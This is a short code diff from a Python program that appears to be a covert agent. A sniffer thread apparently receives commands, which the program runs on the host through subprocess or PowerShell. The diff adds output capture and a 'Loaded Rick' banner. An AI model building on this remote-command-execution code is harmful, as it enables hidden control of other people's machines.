@@ -24,9 +24,11 @@ def cmd_proc(cmd):
         elif term == "p":
             print("A")
     elif prefix == "e":
-        if term == "c":
+        if term == "c":#Using this as current test subject is linux
             cmd = cmd.split(" ")
-            sp.run(cmd)
+            result = sp.run(cmd, capture_output=True)
+            if result.check_returncode() is None and verbose:
+                print(result.stdout.decode())
         elif term == "p":
             cmd = cmd.split(" ")
             cmd.insert(0, "powershell")
@@ -60,6 +62,7 @@ def main():
         if sys.argv[1] == "-v":
             verbose = True
     finally:
+        print("Loaded Rick")
         #t1 = threading.Thread(target=heart)
         t2 = threading.Thread(target=sniffer)
         #t1.start()
